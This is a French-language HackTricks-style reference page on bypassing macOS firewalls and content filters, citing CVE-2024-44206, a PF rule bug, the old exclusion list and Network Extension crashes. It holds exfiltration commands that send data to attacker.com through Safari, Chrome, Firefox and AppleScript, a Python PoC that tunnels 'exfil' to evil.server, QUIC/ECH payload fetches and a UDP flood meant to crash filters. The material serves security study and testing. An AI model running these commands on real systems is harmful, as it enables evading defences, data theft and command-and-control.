# Contourner les firewalls sur macOS

{{#include ../../banners/hacktricks-training.md}}

## Techniques trouvées

Les techniques suivantes ont été trouvées comme fonctionnelles dans certaines applications de firewall macOS.

### Abuser des noms de whitelist

- Par exemple, appeler le malware avec des noms de processus macOS bien connus comme **`launchd`**

### Synthetic Click

- Si le firewall demande une autorisation à l'utilisateur, faire **cliquer le malware sur Allow**

### **Utiliser des binaires signés par Apple**

- Comme **`curl`**, mais aussi d'autres comme **`whois`**

### Domaines Apple bien connus

Le firewall pourrait autoriser les connexions vers des domaines Apple bien connus tels que **`apple.com`** ou **`icloud.com`**. iCloud pourrait également être utilisé comme C2.

### Contournement générique

Quelques idées à essayer pour contourner les firewalls

### Vérifier le trafic autorisé

Connaître le trafic autorisé vous aidera à identifier les domaines potentiellement présents dans la whitelist ou les applications autorisées à y accéder
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abuser du DNS

Les résolutions DNS sont effectuées via l’application signée **`mdnsreponder`**, qui sera probablement autorisée à contacter les serveurs DNS.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via les applications de navigateur

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Si vous pouvez **inject code into a process** autorisé à se connecter à n’importe quel serveur, vous pourriez bypass les protections du firewall :


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnérabilités récentes permettant de bypass le firewall macOS (2023-2025)

### Bypass du filtre de contenu Web (Screen Time) – **CVE-2024-44206**
En juillet 2024, Apple a corrigé un bug critique dans Safari/WebKit qui contournait le « filtre de contenu Web » global utilisé par les contrôles parentaux de Screen Time.
Un URI spécialement conçu (par exemple, avec « :// » doublement encodé dans l’URL) n’est pas reconnu par l’ACL de Screen Time, mais est accepté par WebKit ; la requête est donc envoyée sans filtrage. Tout process capable d’ouvrir une URL (y compris du code sandboxed ou unsigned) peut ainsi atteindre des domaines explicitement bloqués par l’utilisateur ou un profil MDM.<sup>[2]</sup>

Test pratique (sur un système non patché) :
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug d’ordre des règles de Packet Filter (PF) dans les premières versions de macOS 14 « Sonoma »
Pendant le cycle bêta de macOS 14, Apple a introduit une régression dans le wrapper userspace autour de **`pfctl`**.
Les règles ajoutées avec le mot-clé `quick` (utilisé par de nombreux kill-switches VPN) étaient silencieusement ignorées, ce qui provoquait des leaks de trafic même lorsqu’une interface graphique de VPN/firewall indiquait que le trafic était *blocked*. Le bug a été confirmé par plusieurs fournisseurs de VPN et corrigé dans la RC 2 (build 23A344).

Vérification rapide des leaks :
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abus de services auxiliaires signés par Apple (legacy – pre-macOS 11.2)
Avant macOS 11.2, **`ContentFilterExclusionList`** autorisait environ 50 binaires Apple, notamment **`nsurlsessiond`** et l’App Store, à contourner tous les socket-filter firewalls implémentés avec le framework Network Extension (LuLu, Little Snitch, etc.).
Les malware pouvaient simplement spawn un processus exclu — ou y injecter du code — et tunneler leur propre trafic via le socket déjà autorisé. Apple a complètement supprimé la liste d’exclusion dans macOS 11.2, mais cette technique reste pertinente sur les systèmes qui ne peuvent pas être mis à niveau.<sup>[3]</sup>

Exemple de proof-of-concept (pre-11.2) :
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH pour contourner les filtres de domaines de Network Extension (macOS 12+)
Les NEFilter Packet/Data Providers se basent sur le SNI/ALPN du TLS ClientHello. Avec **HTTP/3 over QUIC (UDP/443)** et **Encrypted Client Hello (ECH)**, le SNI reste chiffré, NetExt ne peut pas analyser le flux, et les règles de nom d’hôte échouent souvent en mode fail-open, permettant aux malwares d’atteindre des domaines bloqués sans interagir avec le DNS.<sup>[5]</sup>

PoC minimal :
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Si QUIC/ECH est toujours activé, il s’agit d’une voie simple de contournement du filtrage de hostname.

### Instabilité de Network Extension sur macOS 15 « Sequoia » (2024–2025)
Les premières versions 15.0/15.1 font crasher les filtres **Network Extension** tiers (LuLu, Little Snitch, Defender, SentinelOne, etc.). Lorsque le filtre redémarre, macOS supprime ses règles de flux et de nombreux produits adoptent un comportement fail-open. Inonder le filtre avec des milliers de flux UDP courts (ou forcer QUIC/ECH) peut provoquer de manière répétée le crash et laisser une fenêtre pour le C2/l’exfiltration, alors que l’interface graphique indique toujours que le firewall est actif.<sup>[4]</sup>

Reproduction rapide (machine de lab sûre) :
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Conseils d'outillage pour macOS moderne

1. Inspecter les règles PF actuelles générées par les firewalls avec interface graphique :
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Énumérer les binaires qui détiennent déjà l'*entitlement outgoing-network* (utile pour s'appuyer dessus) :
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Enregistrer programmatiquement son propre filtre de contenu Network Extension en Objective-C/Swift.
Un PoC rootless minimal qui redirige les paquets vers un socket local est disponible dans le code source de **LuLu** de Patrick Wardle.

## Références

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Le contournement du filtre de contenu web d'Apple permet un accès sans restriction au contenu bloqué (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple supprime la fonctionnalité macOS qui permettait aux apps de contourner la sécurité du firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Les produits de cybersécurité cessent de fonctionner après la mise à jour vers macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Utiliser la protection réseau pour empêcher les connexions macOS vers des sites malveillants - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
